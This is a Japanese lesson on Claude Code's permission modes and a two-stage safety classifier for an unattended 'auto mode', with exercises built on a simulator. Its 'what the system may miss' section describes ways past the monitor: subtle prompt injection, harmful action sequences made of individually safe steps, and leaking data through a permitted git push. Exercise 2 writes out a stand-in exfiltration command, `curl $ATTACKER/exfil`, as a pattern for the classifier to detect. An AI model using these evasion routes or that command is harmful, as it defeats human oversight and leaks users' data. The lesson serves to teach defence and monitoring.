# 自律エージェントとしてのClaude Code：権限モードと自動モード

> Claude Codeは7つの権限モードを公開しています。「plan」はすべてのアクション前に確認を求め、「default」はリスキーなアクションのみを確認します。「acceptEdits」はファイル書き込みを自動承認しますが、シェル実行はまだ確認します。「bypassPermissions」はすべてを承認します。自動モード（2026年3月24日）はアクションごとの承認を2段階の並列安全分類器に置き換えます：単一トークンの高速チェックはすべてのアクションで実行されます。フラグが付いたアクションは思考の連鎖による深いレビューを開始します。アクション予算は`max_turns`と`max_budget_usd`を通じて実行されます。自動モードはリサーチプレビューとして出荷されました。Anthropicは分類器が単独では十分ではないことを明示的に述べています。

**タイプ:** 学習
**言語:** Python（標準ライブラリ、2段階分類器シミュレータ）
**前提条件:** Phase 15 · 01 (長地平エージェント)、Phase 15 · 09 (コーディングエージェントランドスケープ)
**所要時間:** 約45分

## 問題

マシン上の自律コーディングエージェントは、個別のセキュリティカテゴリです。攻撃表面は、エージェントが到達できるすべてです。ファイルシステム、ネットワーク、認証情報、クリップボード、すべてのブラウザタブ、すべての開いているターミナル。Bruce Schneierおよび他のものは、これを公開的にフラグを立てました。コンピュータ使用エージェントはチャットボットの「機能更新」ではなく、新しい種類のツールと新しい種類のリスク対も。

Claude Codeの権限システムはAnthropicの答えです。「自律的/自律的ではない」という1つのスイッチではなく、能力ラダーにまたがる7つのモード：plan → default → acceptEdits → ... → bypassPermissions。各モードは速度とアクション当たりのレビューの間の異なるトレードオフです。自動モード（2026年3月）は、分類器が安全と判断するアクションのユーザーの臨界パスを消すため、分類器がアクションをフラグするレビューレイヤーを保持しながら2段階分類器を追加します。

エンジニアリング上の質問：このシステムは何をキャッチし、何を見逃し、どのモードが特定のタスクが実際に保証していますか？

## コンセプト

### 7つの権限モード

| モード | 動作 | 使用時期 |
|---|---|---|
| `plan` | エージェントがプランを提案します。ユーザーはプラン全体を承認します。すべてのアクションは実行前にレビューされます | 不明確なタスク。本番隣接のコード。レポでエージェントを初めて使用する時 |
| `default` | エージェントはアクションを実行します。「リスキー」なアクション（シェル実行、破壊的操作、ネットワーク呼び出し）のためにユーザーにプロンプトします | ほとんどのインタラクティブなコーディングセッション |
| `acceptEdits` | ファイル書き込みの自動承認。シェル実行とネットワーク呼び出しはまだプロンプトします | 多くのファイルのリファクタリングパス |
| `acceptExec` | キュレーション許可リスト内のシェルコマンドの自動承認。書き込みの自動承認 | `npm test`またはそれに類するシェルコマンドのタイトな内部ループ |
| `autoMode` | 2段階安全分類器。フラグが付いたアクションはレビューに昇格します | 制約されたワークスペース内の長地平の無人実行 |
| `yolo` | ほとんどのプロンプトをスキップします。ツール許可リスト/拒否リストを実行します | 短命のサンドボックス、CIジョブ、リサーチスクリプト |
| `bypassPermissions` | すべてを承認します | 「破棄する意思のある短命のコンテナ内のみ」と説明されています |

（上記の名前は公開Claude Codeドキュメントと一致します。「yolo」は許可的な中間地帯の非公式な短縮形です。）

### 自動モード（1ページ）

自動モード（2026年3月24日に起動）は、アクションごとの承認をモデルに委譲する最初の権限モードです。構造：

1. **段階1 - 単一トークン分類器。** すべての提案されたアクションで実行します。安い。「安全」または「フラグ」を返します。メインエージェントループと並行して実行されるように設計されているため、承認されたアクションはキューに座りません。
2. **段階2 - セカンダリポリシー/安全性レビュー。** フラグが付いたアクションでのみ実行されます。アクション、セッションの現在の状態、および宣言されたタスクに関する焦点を絞ったポリシーと安全性の評価を実行します。信頼度が低い場合、ユーザーHITLにエスカレートします。

予算制御は分類器の隣に座ります：

- `max_turns` — セッション内の総イテレーション。
- `max_budget_usd` — セッションを中止するドル上限。
- ツール当たりのアクション数制限（`WebFetch`コールなし以上、など）。

### システムがキャッチするもの

- ツール入力への簡単なプロンプトインジェクション。注入された命令は既知のリスキーなアクション形に対応します。
- 反復的なツールループ - 分類器はアクションN+1がアクションNとほぼ同じで、5回連続しているかどうかを確認できます。
- ファイル編集のみのセッションで明らかに範囲外のシェルコマンド。

### システムが見逃す可能性があるもの

- **微妙なプロンプトインジェクション**：単一のフラグが付いたアクションを生成することなく動作を変調します。間接的なプロンプトインジェクションは完全にパッチ可能な脆弱性ではありません（OpenAI準備ヘッド、2025年、ブラウザエージェント上 - レッスン11を参照）。
- **セマンティックレベルの不正な動作。** すべての個別のアクションは安全に見えることができますが、合成された軌跡は有害です。分類器はアクションを判断します。ユーザーの意図を再導出しません。
- **正当なチャネルを通じた情報流出。** 自分が所有するファイルにデータを書き込み、その後`git push`を公開repoに行うことは、許可されたアクションのシーケンスです。その構成が問題です。

### リサーチプレビューフレーミング

Anthropicは自動モードをリサーチプレビューとして出荷しました。分類器はレイヤーであり、ソリューションではないのは明示的です。ユーザーは自動モードを予算、許可リスト、分離ワークスペース、および軌跡監査と組み合わせることが期待されます（レッスン12～16）。プレビューフレーミングは、記載された評価と配置ギャップも反映しています（レッスン1）。オフライン評価に合格する分類器は、ユーザーのコンテキストが曖昧な実際のセッションで異なる動作を示す可能性があります。

### このラダーがワークフローに住む場所

- 不明確なタスク：`plan`で開始します。プランの読み取りは悪い実行をロールバックするより安いです。
- 既知のリファクタ：`acceptEdits`は多くの確認クリックを節約します。
- 無人バックグラウンド実行：`autoMode`は、ブラストラディアスを測定したワークスペース内のみ（認証情報なし、本番マウントなし、要求していない出力なし）。
- 短命のコンテナ：`yolo` / `bypassPermissions`は、コンテナとその認証情報が使い捨てである場合にのみ受け入れられます。

## 使用方法

`code/main.py`は2段階分類器をシミュレートします。段階1は提案されたアクション上の安い単語規則です。段階2は遅いマルチルールレビューアです。ドライバーは短い合成軌跡（安全なアクション、プロンプトインジェクション試み、反復的なループ）を供給し、分類器がキャッチする場所と見逃す場所を示しています。

## 運用

`outputs/skill-permission-mode-picker.md`はタスク記述を正しい権限モード、予算上限、および必要な隔離に一致させます。

## 演習

1. `code/main.py`を実行します。段階1によってフラグが付けられることなく、常に段階2によってキャッチされるどの合成アクション型ですか？どれもキャッチされないのはどれですか？

2. 特定の既知の悪い形を捕捉するために段階1ルールセットを拡張します（例：`curl $ATTACKER/exfil`）。善良なアクションサンプルの偽陽性率を測定します。

3. Anthropicの「エージェントループの仕組み」docを読みます。デフォルトの`default`モードでエージェントが接触するすべての外部状態をリストアップします。`autoMode`を無人で実行する前に、別々にゲーティングする必要があるのはどれですか？

4. 24時間無人実行予算を設計します：`max_turns`、`max_budget_usd`、ツール当たりキャップ、許可リスト。各番号を正当化します。

5. 段階1および段階2で承認されたすべての個別のアクションであるが、合成された動作が未調整である軌跡を1つ説明します。（レッスン14は、キルスイッチとカナリトークンがこれに対処する方法をカバーしています。）

## キーターム

| タイプ | 人々が言うこと | それが実際に意味するもの |
|---|---|---|
| 権限モード | 「エージェントがいくつできるか」 | アクションごとの承認を制御する7つの指定されたポリシーのいずれか |
| planモード | 「何でも前に聞いてください」 | エージェントはプランを書き込みます。ユーザーは実行前に承認します |
| acceptEdits | 「ファイルを書き込みできます」 | ファイル書き込みの自動承認。シェル実行はまだプロンプトします |
| autoMode | 「自動承認」 | 2段階安全分類器。フラグが付いたアクションはエスカレート |
| bypassPermissions | 「完全YOLO」 | すべてを承認します。短命のコンテナを意図 |
| 段階1分類器 | 「高速トークンチェック」 | 提案されたアクション上の単一トークンルール。並行して実行 |
| 段階2分類器 | 「深いレビュー」 | フラグが付いたアクション上の思考の連鎖推論 |
| リサーチプレビュー | 「GA以外」 | 失敗モードがまだマッピングされている機能のAnthropicフレーミング |
